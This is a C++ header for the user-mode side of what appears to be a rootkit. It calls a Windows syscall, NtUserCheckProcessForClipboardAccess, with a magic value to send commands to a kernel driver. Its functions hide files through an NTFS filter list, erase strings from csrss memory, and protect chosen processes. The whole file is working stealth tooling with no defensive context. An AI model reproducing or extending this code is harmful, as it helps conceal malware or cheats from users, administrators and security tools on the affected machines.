#pragma once
#include <windows.h>
#include <chrono>
#include <iostream>

#define getRL64() ((ULONG64)rand() << 48) | ((ULONG64)rand() << 32) | ((ULONG64) rand() << 16) | (ULONG64) rand()
using namespace std;

namespace Comm {


	struct Command {
		BYTE action;
		ULONG64 param1;
		ULONG64 param2;
		ULONG64 param3;
	};

	const BYTE HEARTBEAT = 0x10;
	const BYTE NTFS_FILTER_ADD = 0x20;
	const BYTE NTFS_FILTER_REMOVE = 0x30;
	const BYTE CSRSS_STRING_REMOVE = 0x40;
	const BYTE PROTECT_PROCESS = 0x50;
	const BYTE UNPROTECT_PROCESS = 0x60;

	
	using NtUserCheckProcessForClipboardAccess_t = ULONG64(__fastcall*)(ULONG64, ULONG64, ULONG64, ULONG64);
	NtUserCheckProcessForClipboardAccess_t NtUserCheckProcessForClipboardAccess;

	ULONG64 makeCall(ULONG64 p) {
		return NtUserCheckProcessForClipboardAccess(p,0,0xa11baba,0);
	}
	bool initNt() {
		srand(time(0) * 1000);
		LoadLibraryA("user32.dll");
		HMODULE h = LoadLibraryA("win32u.dll");
		if (h == 0) {
			cout << "Couldn't load win32u.dll" << endl;
			return false;
		}
		NtUserCheckProcessForClipboardAccess = (NtUserCheckProcessForClipboardAccess_t)GetProcAddress(h, "NtUserCheckProcessForClipboardAccess");

		if (NtUserCheckProcessForClipboardAccess == 0) {
			return false;
		}
		return true;
	}

	bool doHeartbeat() {
		Command c = {};
		c.action = HEARTBEAT;
		c.param1 = getRL64();
		bool b = (makeCall((ULONG64)&c) == 0xb00b && c.param2 == 1 && c.param3 == c.param1);
		RtlSecureZeroMemory(&c, sizeof(c));
		return b;
	}

	bool addToFilterList(wchar_t* data, USHORT len) { //Strings in the filter list ARE case sensitive
		Command c = {};
		c.action = NTFS_FILTER_ADD;
		c.param1 = len;
		c.param2 = (ULONG64) data;
		bool b = (makeCall((ULONG64)&c) == 0xb00b && c.param3 == 1);
		RtlSecureZeroMemory(&c,sizeof(c));
		return b;
	}

	bool removeFromFilterList(wchar_t* data, USHORT len) { 
		Command c = {};
		c.action = NTFS_FILTER_REMOVE;
		c.param1 = len;
		c.param2 = (ULONG64)data;
		bool b = (makeCall((ULONG64)&c) == 0xb00b && c.param3 == 1);
		RtlSecureZeroMemory(&c, sizeof(c));
		return b;
	}

	bool removeStrFromCsrss(wchar_t* data, USHORT len) {
		Command c = {};
		c.action = CSRSS_STRING_REMOVE;
		c.param1 = len;
		c.param2 = (ULONG64)data;
		bool b = (makeCall((ULONG64)&c) == 0xb00b && c.param3 == 1);
		RtlSecureZeroMemory(&c, sizeof(c));
		return b;
	}

	bool protectProcessId(ULONG64 pid) {
		if (pid == 0) {
			return 0;
		}
		Command c = {};
		c.action = PROTECT_PROCESS;
		c.param1 = pid;
		bool b = (makeCall((ULONG64)&c) == 0xb00b && c.param3 == 1);
		RtlSecureZeroMemory(&c, sizeof(c));
		return b;
	}

	bool unProtectProcessId(ULONG64 pid) {
		if (pid == 0) {
			return 0;
		}
		Command c = {};
		c.action = UNPROTECT_PROCESS;
		c.param1 = pid;
		bool b = (makeCall((ULONG64)&c) == 0xb00b && c.param3 == 1);
		RtlSecureZeroMemory(&c, sizeof(c));
		return b;
	}
}